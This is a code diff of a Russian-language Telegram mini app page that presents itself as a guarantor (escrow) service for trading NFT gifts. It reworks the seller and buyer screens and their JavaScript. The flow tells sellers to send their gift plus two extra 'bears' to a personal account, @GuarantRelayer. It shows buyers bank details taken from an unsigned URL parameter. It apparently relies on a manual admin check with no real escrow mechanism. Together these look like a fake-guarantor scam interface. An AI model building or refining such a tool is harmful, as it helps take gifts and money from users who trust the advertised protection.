@@ -23,7 +23,6 @@
         .action-box { background: rgba(46, 166, 255, 0.05); border: 1px dashed var(--accent); border-radius: 14px; padding: 14px; text-align: center; cursor: pointer; }
         .action-box .value { font-size: 14px; font-weight: 700; color: var(--accent); margin-top: 4px; word-break: break-all; }
         .instruction { font-size: 13px; color: var(--text-muted); line-height: 1.4; }
-        .instruction b { color: var(--text-main); }
         .btn { width: 100%; padding: 14px; border: none; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; background: var(--accent); color: #fff; text-align: center; margin-top: 8px; }
         .btn-success { background: var(--success); color: #0b0c10; }
         .btn-danger { background: transparent; border: 1px solid var(--danger); color: var(--danger); }
@@ -32,9 +31,7 @@
         hr { border: 0; border-top: 1px solid var(--card-border); }
         .badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; }
         .badge.warning { background: rgba(245, 158, 11, 0.15); color: var(--warning); }
-        .badge.success { background: rgba(34, 197, 94, 0.15); color: var(--success); }
         .hidden { display: none !important; }
-        .text-center { text-align: center; }
     </style>
 </head>
 <body>
@@ -44,53 +41,39 @@
         <p>Безопасные сделки с NFT подарками</p>
     </div>
 
-    <!-- 1. СОЗДАНИЕ СДЕЛКИ (ПРОДАВЕЦ) -->
-    <div id="createView" class="card">
-        <div class="card-title">📦 Создание сделки</div>
-        <div class="form-group"><label>Название подарка</label><input type="text" class="form-control" id="giftName" placeholder="Владосик Мишка"></div>
-        <div class="form-group"><label>Сумма к оплате (в рублях)</label><input type="number" class="form-control" id="giftPrice" placeholder="1500"></div>
-        <hr>
-        <div style="font-size: 13px; font-weight: 700; color: var(--accent);">Реквизиты для получения денег</div>
-        <div class="form-group"><label>Банк</label><input type="text" class="form-control" id="payBank" placeholder="Сбер / Т-Банк"></div>
-        <div class="form-group"><label>Карта / Телефон</label><input type="text" class="form-control" id="payCard" placeholder="+7 999 000-00-00"></div>
-        <div class="form-group"><label>Комментарий (по желанию)</label><input type="text" class="form-control" id="payComment" placeholder="За подарок"></div>
-        <button class="btn" onclick="createDeal()">Сгенерировать сделку</button>
-    </div>
-
-    <!-- 2. ШАГ ССЫЛКИ И ОТПРАВКИ -->
-    <div id="shareView" class="card hidden">
-        <div class="card-title">🔗 Персональная ссылка</div>
-        <div class="instruction">Отправьте эту ссылку покупателю:</div>
-        <div class="action-box" onclick="copyText(document.getElementById('personalDealLink').textContent)">
-            <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования:</div>
-            <div class="value" id="personalDealLink"></div>
+    <!-- ИНТЕРФЕЙС ПРОДАВЦА -->
+    <div id="sellerView">
+        <div id="sellerStep1" class="card">
+            <div class="card-title">📦 Создание сделки</div>
+            <div class="form-group"><label>Название подарка</label><input type="text" class="form-control" id="giftName" placeholder="Владосик Мишка"></div>
+            <div class="form-group"><label>Сумма к оплате (в рублях)</label><input type="number" class="form-control" id="giftPrice" placeholder="1500"></div>
+            <hr>
+            <div style="font-size: 13px; font-weight: 700; color: var(--accent);">Реквизиты для получения денег</div>
+            <div class="form-group"><label>Банк</label><input type="text" class="form-control" id="payBank" placeholder="Сбер / Т-Банк"></div>
+            <div class="form-group"><label>Карта / Телефон</label><input type="text" class="form-control" id="payCard" placeholder="+7 999 000-00-00"></div>
+            <div class="form-group"><label>Комментарий (по желанию)</label><input type="text" class="form-control" id="payComment" placeholder="За подарок"></div>
+            <button class="btn" onclick="nextToDeposit()">Далее: Отправка активов</button>
         </div>
-        <div class="instruction"><b>1.</b> Отправьте подарок и 2 мишки на аккаунт:</div>
-        <div class="action-box" onclick="copyText('@GuarantRelayer')">
-            <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования аккаунта:</div>
-            <div class="value">@GuarantRelayer</div>
+
+        <div id="sellerStep2" class="card hidden">
+            <div class="card-title"><span>📤 Отправка гаранту</span><span class="badge warning">Шаг 2</span></div>
+            <div class="instruction">1. Отправьте подарок и 2 мишки на аккаунт:</div>
+            <div class="action-box" onclick="copyText('@GuarantRelayer')">
+                <div style="font-size: 11px; color: var(--text-muted);">Нажмите для копирования:</div>
+                <div class="value">@GuarantRelayer</div>
+            </div>
+            <div class="instruction">2. После отправки нажмите кнопку ниже. Бот отправит запрос на проверку в группу.</div>
+            <button class="btn btn-success" onclick="sellerDoneDeposit()">✅ Я отправил активы</button>
+            <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
         </div>
-        <button class="btn btn-success" onclick="sellerDoneDeposit()">✅ Я отправил активы гаранту</button>
-        <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
     </div>
 
-    <!-- 3. ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ ПРОДАВЦОМ -->
-    <div id="sellerWaitView" class="card hidden text-center">
-        <div class="card-title"><span>⏳ Проверка активов</span><span class="badge warning">Ожидание админа</span></div>
-        <div class="instruction">Вы отправили активы. Ожидайте, пока администратор проверит перевод в группе и подтвердит сделку.</div>
-        <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
-    </div>
-
-    <!-- 4. ИНТЕРФЕЙС ПОКУПАТЕЛЯ -->
-    <div id="buyerWaitView" class="card hidden text-center">
-        <div class="card-title"><span>⏳ Ожидание гаранта</span><span class="badge warning">Проверка подарка</span></div>
-        <div class="instruction">Вы открыли сделку по подарку: <b id="bWaitGift">—</b></div>
-        <div class="instruction">Продавец еще не передал активы гаранту или администратор еще не подтвердил получение. <b>Ожидайте...</b> Обновите страницу позже.</div>
-        <button class="btn btn-danger" onclick="openSupport()">🆘 Поддержка (Спор)</button>
-    </div>
-
-    <div id="buyerPayView" class="card hidden">
-        <div class="card-title"><span>💳 Оплата сделки</span><span class="badge success">Активы у гаранта</span></div>
+    <!-- ИНТЕРФЕЙС ПОКУПАТЕЛЯ -->
+    <div id="buyerView" class="card hidden">
+        <div class="card-title">
+            <span>💳 Оплата сделки</span>
+            <span class="badge warning">Активы у гаранта</span>
+        </div>
         <div class="info-row"><span class="label">Подарок:</span><span class="val" id="bGiftName">—</span></div>
         <div class="info-row"><span class="label">Сумма:</span><span class="val" style="color: var(--success);" id="bGiftPrice">0 ₽</span></div>
         <hr>
@@ -108,113 +91,65 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        let currentDealId = Math.floor(1000 + Math.random() * 9000);
-        let dealData = {};
+        let currentDealId = "";
 
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            const dealIdParam = urlParams.get('deal_id') || tg.initDataUnsafe?.start_param?.replace('deal_', '');
+            const payParam = urlParams.get('pay_data');
 
-            if (dealIdParam) {
-                // Если открыли по ссылке сделки (покупатель)
-                currentDealId = dealIdParam;
-                loadDealDataForBuyer(dealIdParam);
+            if (payParam) {
+                document.getElementById('sellerView').classList.add('hidden');
+                document.getElementById('buyerView').classList.remove('hidden');
+                try {
+                    const data = JSON.parse(decodeURIComponent(payParam));
+                    currentDealId = data.id || "";
+                    document.getElementById('bGiftName').textContent = data.gift;
+                    document.getElementById('bGiftPrice').textContent = data.price + ' ₽';
+                    document.getElementById('rBank').textContent = 'Банк: ' + data.bank;
+                    document.getElementById('rCard').textContent = data.card;
+                    document.getElementById('rComment').textContent = 'Комментарий: ' + (data.comment || 'Нет');
+                } catch(e) { console.error(e); }
             }
         };
 
-        function createDeal() {
+        function nextToDeposit() {
             const gift = document.getElementById('giftName').value.trim();
             const price = document.getElementById('giftPrice').value.trim();
             const bank = document.getElementById('payBank').value.trim();
             const card = document.getElementById('payCard').value.trim();
-            const comment = document.getElementById('payComment').value.trim();
 
             if (!gift || !price || !bank || !card) {
                 tg.showAlert("Заполните название, сумму и реквизиты!");
                 return;
             }
 
-            dealData = { gift, price, bank, card, comment };
-            
-            // Сохраняем в localStorage, чтобы продавец при возврате видел свои данные
-            localStorage.setItem(`deal_${currentDealId}`, JSON.stringify(dealData));
-
-            const personalLink = `https://t.me/GuarantMiniApp_bot?start=deal_${currentDealId}`;
-            document.getElementById('personalDealLink').textContent = personalLink;
-
-            // Отправляем данные боту
-            if (tg.initData) {
-                tg.sendData(JSON.stringify({
-                    action: "create_deal",
-                    deal_id: currentDealId,
-                    ...dealData
-                }));
-            }
-
-            document.getElementById('createView').classList.add('hidden');
-            document.getElementById('shareView').classList.remove('hidden');
+            document.getElementById('sellerStep1').classList.add('hidden');
+            document.getElementById('sellerStep2').classList.remove('hidden');
         }
 
         function sellerDoneDeposit() {
-            if (tg.initData) {
-                tg.sendData(JSON.stringify({
-                    action: "deposit_done",
-                    deal_id: currentDealId,
-                    gift: dealData.gift
-                }));
-            }
-            document.getElementById('shareView').classList.add('hidden');
-            document.getElementById('sellerWaitView').classList.remove('hidden');
-            tg.showAlert("Активы отправлены на проверку!");
-        }
-
-        function loadDealDataForBuyer(dealId) {
-            document.getElementById('createView').classList.add('hidden');
-            
-            // Проверяем, есть ли данные в локальном хранилище браузера (если продавец и покупатель на одном устройстве/тестируют)
-            const saved = localStorage.getItem(`deal_${dealId}`);
-            if (saved) {
-                dealData = JSON.parse(saved);
-                document.getElementById('bWaitGift').textContent = dealData.gift;
-                document.getElementById('bGiftName').textContent = dealData.gift;
-                document.getElementById('bGiftPrice').textContent = dealData.price + ' ₽';
-                document.getElementById('rBank').textContent = 'Банк: ' + dealData.bank;
-                document.getElementById('rCard').textContent = dealData.card;
-                document.getElementById('rComment').textContent = 'Комментарий: ' + (dealData.comment || 'Нет');
-
-                // По умолчанию показываем экран ожидания пока админ не нажмет в группе, 
-                // либо если вы хотите сразу видеть оплату — переключаем в buyerPayView
-                document.getElementById('buyerWaitView').classList.remove('hidden');
-            } else {
-                document.getElementById('buyerWaitView').classList.remove('hidden');
-                document.getElementById('bWaitGift').textContent = "Сделка #" + dealId;
-            }
+            const payload = {
+                action: "deposit_done",
+                gift: document.getElementById('giftName').value.trim(),
+                price: document.getElementById('giftPrice').value.trim(),
+                bank: document.getElementById('payBank').value.trim(),
+                card: document.getElementById('payCard').value.trim(),
+                comment: document.getElementById('payComment').value.trim()
+            };
+            tg.sendData(JSON.stringify(payload));
         }
 
         function buyerPaidAction() {
-            if (tg.initData) {
-                tg.sendData(JSON.stringify({
-                    action: "buyer_paid",
-                    deal_id: currentDealId
-                }));
-            }
-            tg.showAlert("Вы подтвердили перевод! Ожидайте выдачи подарка.");
+            tg.sendData(JSON.stringify({ action: "buyer_paid", deal_id: currentDealId }));
         }
 
         function openSupport() {
-            if (tg.initData) {
-                tg.sendData(JSON.stringify({
-                    action: "support",
-                    deal_id: currentDealId
-                }));
-            }
-            tg.showAlert("Вызов поддержки отправлен!");
+            tg.sendData(JSON.stringify({ action: "support" }));
         }
 
         function copyText(text) {
             navigator.clipboard.writeText(text).then(() => {
-                if (tg.showPopup) tg.showPopup({ title: "Скопировано! ✅", message: text, buttons: [{type: "ok"}] });
-                else alert("Скопировано: " + text);
+                tg.showAlert("Скопировано: " + text);
             });
         }
     </script>
